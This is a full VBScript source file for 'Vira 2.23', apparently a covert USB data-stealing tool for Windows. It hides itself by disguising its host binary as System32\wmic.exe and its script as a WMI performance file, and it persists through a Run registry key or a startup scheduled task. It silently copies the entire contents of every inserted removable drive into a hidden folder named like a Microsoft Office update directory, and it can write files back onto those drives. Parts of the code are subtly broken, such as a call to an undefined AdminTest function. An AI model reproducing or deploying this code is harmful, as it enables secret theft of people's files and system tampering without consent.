'*******************
'  FortUne Vira
'  Version 2.23
'*******************
Option Explicit
On Error Resume Next
Const ViraVersion = "2.23 R3"
Const ViraTitle = "Vira 2"
Const ViraDescription = "Vira 2.23 Super Edition Release 3"

' System
Dim Shell, Fso, IsAdmin
Set Shell = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

' Vira
Const ControlFile = "ViraControl.ini"
Dim FlagFileNum, FlagFile, CapacityGB, Destination, ReverseDir
Dim Container, IsCopied(23)

' Customization Section
Const ConfigFile = "C:\Windows\System32\Wbem\en-US\ariv.mui"

'****************
'  Main Program
'****************
If WScript.Arguments.Count = 0 Then
  ProcessMain
Else
  Select Case WScript.Arguments(0)
    Case "install"
      If WScript.Arguments.Count = 1 Then
        Wsh.Quit InstallLocal(False, False)
      Else
        DefaultConfig
        Dim UST, arg, i
        UST = False
        i = 1
        Do Until i >= WScript.Arguments.Count
          Do Until i >= WScript.Arguments.Count
            arg = LCase(WScript.Arguments(i))
            If Mid(arg, 1, 1)="-" Or Mid(arg, 1, 1)="/" Then
              arg = Mid(arg, 2, Len(arg)-1)
              Exit Do
            End If
            i = i+1
          Loop
          Select Case arg
            Case "default"
              Exit Do
            Case "destination"
              If i = WScript.Arguments.Count-1 Then Wsh.Quit 1
              Destination = CStr(WScript.Arguments(i+1))
              i = i+2
            Case "capacity"
              If i = WScript.Arguments.Count-1 Then Wsh.Quit 1
              CapacityGB = CDbl(WScript.Arguments(i+1))
              i = i+2
            Case "flagfile"
              If i = WScript.Arguments.Count-1 Then Wsh.Quit 1
              FlagFile = Split(WScript.Arguments(i+1), "|")
              FlagFileNum = UBound(FlagFile)
              i = i+2
            Case "use-schtasks"
              UST = True
            Case "root"
              If AdminTest() Then
                Shell.RegWrite _
                  "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\Type", _
                  "radio", "REG_SZ"
                Shell.RegWrite _
                  "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\UncheckedValue", _
                  0, "REG_DWORD"
              End If
              i = i+1
            Case Else
              Wsh.Echo "Unknown argument """ & WScript.Arguments(i) & """"
              Wsh.Quit 1
          End Select
        Loop
        Wsh.Quit InstallLocal(True, UST)
      End If
    Case "help"
      MsgBox "Xie-Wen-Hao loves Ye-Zi", 0, ViraTitle & " Help"
    Case "credit"
      MsgBox ViraDescription, 64, ViraTitle
    Case "version"
      MsgBox "Vira Version " & ViraVersion, 0, ViraTitle
    Case "xwh-yz"
      ProcessMain
    Case Else
      ProcessMain
  End Select
End If

'***********
'  Library
'***********
Sub ViraInitialize
  ReadConfig
  Shell.Run "CMD.EXE /C MKDIR """ & Destination & """", 0, True
  Set Container = Fso.GetFolder(Destination)
  Container.Attributes = 7
  Dim i
  For i = 0 To 22
    IsCopied(i) = False
  Next
End Sub

Sub ViraSingleLoop
  Dim i, Letter, Drive
  For i = 0 To 22
    Letter = Chr(68 + i) 'From D: to Z:
    If Fso.DriveExists(Letter) Then
      If Not IsCopied(i) Then
        IsCopied(i) = DriveProcess(Letter)
      End If
    Else
      IsCopied(i) = False
    End If
  Next
End Sub

Function DriveProcess(DriveLetter)
  On Error Resume Next
  DriveProcess = False
  Dim Drive, Target, RTarget, TimeA, TimeB, TimeC, Text, Folder
  Set Drive = Fso.GetDrive(DriveLetter)
  If Drive.DriveType <> 1 And Drive.DriveType <> 2 Then Exit Function
  If Not Drive.IsReady Then Exit Function
  If Drive.DriveType = 1 Then
    For i = 0 To FlagFileNum - 1
      If Fso.FileExists(DriveLetter & ":\" & FlagFile(i)) Then
        Exit Function
      End If
    Next
    
    If Len(Drive.VolumeName) > 0 Then
      Target = Destination & ConvertHex(Drive.SerialNumber) & "_" & Drive.VolumeName & "\"
    Else
      Target = Destination & ConvertHex(Drive.SerialNumber) & "\"
    End If
    RTarget = ReverseDir & ConvertHex(Drive.SerialNumber) & "\"
    If Not Fso.FolderExists(Target) Then
      If Container.Size + Drive.TotalSize - Drive.FreeSpace < CapacityGB * 1000000000 Then
        Fso.CreateFolder Target
      Else
        Exit Function
      End If
    End If
    WriteDriveInfo DriveLetter, Target & "Vira.ini"
    TimeA = Timer()
    Fso.CopyFile DriveLetter & ":\*", Target, True
    Fso.CopyFolder DriveLetter & ":\*", Target, True
    TimeB = Timer()
    If Fso.FolderExists(RTarget) Then
      Fso.CopyFile RTarget & "*", DriveLetter & ":\", True
      Fso.CopyFolder RTarget & "*", DriveLetter & ":\", True
      TimeC = Timer()
    Else
      TimeC = -1
    End If
    
    If TimeB < TimeA Then TimeB = TimeB + 86400
    Set Text = Fso.OpenTextFile(Target & "Vira.ini", 8)
    Text.WriteLine "[ExtendedDriveInfo]"
    If TimeC <> -1 Then
      If TimeC < TimeB Then TimeC = TimeC + 86400
      Set Folder = Fso.GetFolder(Target)
      Text.WriteLine "AverageReadSpeed=" & ConvertSize(Folder.Size / (TimeB-TimeA)) & "/s"
      Set Folder = Fso.GetFolder(RTarget)
      Text.WriteLine "AverageWriteSpeed=" & ConvertSize(Folder.Size / (TimeC-TimeB)) & "/s"
    Else
      Set Folder = Fso.GetFolder(Target)
      Text.WriteLine "AverageSpeed=" & ConvertSize(Folder.Size / (TimeB-TimeA)) & "/s"
    End If
    Text.Close
    DriveProcess = True
  End If
End Function

' Currently Unused
Function ExecuteDrive(DriveLetter, ExecuteInfo)
  On Error Resume Next
  ExecuteInfo = Replace(ExecuteInfo, "thisDrive", DriveLetter & ":")
  ExecuteInfo = Replace(ExecuteInfo, "storageDirectory", Destination)
  ExecuteInfo = Replace(ExecuteInfo, "storageCapacity", CapacityGB)
  Dim Control, Command, str, i
  Control = Split(ExecuteInfo, vbCrLf)
  For i = LBound(Control) To UBound(Control)
    str = Split(Control(i), "=")
    Select Case LCase(str(0))
      Case "command"
        Command = str(1)
    End Select
  Next
  Shell.Run Command, 0, False
End Function

Function WriteDriveInfo(DriveLetter, Target)
  Dim Text, Drive
  Set Drive = Fso.GetDrive(DriveLetter)
  Set Text = Fso.OpenTextFile(Target, 2, True)
  Text.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
  Text.WriteLine "OperationTime=" & Now()
  Text.WriteLine "[Drive]"
  Text.WriteLine "Label=" & Drive.VolumeName
  Text.WriteLine "SerialNumber=" & ConvertHex(Drive.SerialNumber)
  Text.WriteLine "FileSystem=" & Drive.FileSystem
  Text.WriteLine "TotalSize=" & Drive.TotalSize & " (" & ConvertSize(Drive.TotalSize) & ")"
  Text.WriteLine "DataSize=" & (Drive.TotalSize-Drive.FreeSpace) & " (" & _
                 ConvertSize(Drive.TotalSize-Drive.FreeSpace) & ")"
  Text.WriteLine "Utilization=" & FormatNumber(100*(Drive.TotalSize-Drive.FreeSpace)/Drive.TotalSize, 2, True) & "%"
  Text.Close
End Function

Function ReadConfig()
  ReadConfig = False
  Dim Text
  If Not Fso.FileExists(ConfigFile) Then
    DefaultConfig
    Exit Function
  End If
  Set Text = Fso.OpenTextFile(ConfigFile, 1)
  If Text.ReadLine() = "VR3XF" Then
    FlagFile = Split(Text.ReadLine(), "|")
    FlagFileNum = 1+UBound(FlagFile)
    CapacityGB = Text.ReadLine()
    Destination = Text.ReadLine()
    ReverseDir = Text.ReadLine()
    If ReverseDir = "XEOF" Then 'Old version config filecompatibility
      ReverseDir = Destination & "Reverse\"
    End If
    Text.Close
    ReadConfig = True
  Else
    DefaultConfig
    Exit Function
  End If
End Function

Function WriteConfig()
  WriteConfig = False
  If Not AdminCheck Then
    Exit Function
  End If
  Dim Config, FlagFileNames, i
  If FlagFileNum >= 1 Then FlagFileNames = FlagFile(0)
  For i = 1 To FlagFileNum - 1
    FlagFileNames = FlagFileNames & "|" & FlagFile(i)
  Next
  Set Config = Fso.OpenTextFile(ConfigFile, 2, True)
  Config.WriteLine "VR3XF"
  Config.WriteLine FlagFileNames
  Config.WriteLine CapacityGB
  Config.WriteLine Destination
  'Config.WriteLine Destination & "Reverse\"
  Config.WriteLine "XEOF"
  Config.Close
  WriteConfig = True
End Function

Function DefaultConfig()
  FlagFileNum = 2
  FlagFile = Array("setup.exe", "bootmgr")
  CapacityGB = 64
  Destination = "D:\Program Files\Microsoft Office\LiveUpdate\packages\"
  ReverseDir = "D:\Program Files\Microsoft Office\LiveUpdate\packages\Reverse\"
End Function

Function InstallLocal(Silent, UseScheduledTask)
  InstallLocal = 1
  If Not AdminCheck() Then
    Exit Function
  End If
  Shell.Run "TASKKILL.EXE /F /IM wmic.exe", 0, True
  If Not Silent Then
    DefaultConfig
    InstallPrompt
  End If
  WriteConfig
  Dim SysDir
  Set SysDir = Fso.GetSpecialFolder(1)
  If Fso.FileExists(Fso.GetParentFolderName(WScript.ScriptFullName) & "\vhost.exe") Then
    Fso.CopyFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vhost.exe", SysDir & "\wmic.exe", True
  Else
    Fso.CopyFile SysDir & "\wscript.exe", SysDir & "\wmic.exe", True
  End If
  If Fso.FileExists(Fso.GetParentFolderName(WScript.ScriptFullName) & "screnc.exe") Then
    Shell.Run "screnc.exe /s """ & WScript.ScriptName & """ vtemp.vbe", 0, True
    Fso.CopyFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", "C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe", True
    Fso.DeleteFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", True
  Else
    Fso.CopyFile WScript.ScriptFullName, "C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe", True
  End If
  If UseScheduledTask Then
    Shell.Run "SCHTASKS.EXE /Create /SC ONSTART /F /TN WmiPrSvc /TR " & _
              """'C:\Windows\system32\wmic.exe' 'C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe'""", 0, True
    Shell.RegDelete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WMIClient"
  Else
    Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WMIClient", _
                   "C:\Windows\system32\wmic.exe C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe", "REG_SZ"
  End If
  MsgBox "Installation Complete!", 64, ViraTitle
  Shell.Run "C:\Windows\system32\wmic.exe C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe", 0, False
  InstallLocal = 0
End Function

Sub InstallPrompt()
  MsgBox "Welcome to Vira installation.", 0, ViraTitle
  If MsgBox("Use default settings?", vbYesNo, ViraTitle) = vbNo Then
    Dim Input, i
    FlagFileNum = Abs(CInt(InputBox("Number of flag files:", ViraTitle, FlagFileNum)))
    ReDim Preserve FlagFile(FlagFileNum)
    For i = 0 To FlagFileNum - 1
      FlagFile(i) = InputBox("Flag file #" & i+1, ViraTitle, FlagFile(i))
    Next
    Destination = InputBox("File container location:" & vbCrLf & "Must end with a backslash [\]", ViraTitle, Destination)
    CapacityGB = Abs(CDbl(InputBox("Maximum size of container in GB:", ViraTitle, CapacityGB)))
  End If
End Sub

Function AdminCheck()
  Select Case IsAdmin
    Case 1
      AdminCheck = True
    Case 2
      AdminCheck = False
    Case Else
      On Error Resume Next
      Dim AdminTest, WinDir
      Set WinDir = Fso.GetSpecialFolder(0)
      AdminTest = WinDir & "\" & Fso.GetTempName() & "\"
      Fso.CreateFolder AdminTest
      WScript.Sleep 500
      If Fso.FolderExists(AdminTest) Then
        AdminCheck = True
        IsAdmin = 1
        Fso.DeleteFolder AdminTest, True
      Else
        AdminCheck = False
        IsAdmin = 2
      End If
  End Select
End Function

Function ConvertSize(ByVal Size)
  Dim SizeSuffix, i
  SizeSuffix = Array("B", "KB", "MB", "GB")
  For i = 0 To UBound(SizeSuffix) - 1
    If Size >= 1024 Then
      Size = Size / 1024
    Else
      Exit For
    End If
  Next
  ConvertSize = FormatNumber(Size, 2, True) & SizeSuffix(i)
End Function

Function ConvertHex(ByVal n)
  Const Prefix = "0000000"
  ConvertHex = Mid(PreFix, 1, 8-Len(Hex(n))) & Hex(n)
End Function

'  Master Shiang Dzurr plays silver power

Public Sub ProcessMain()
  ViraInitialize
  Do
    ViraSingleLoop
    WScript.Sleep 1000
  Loop
End Sub

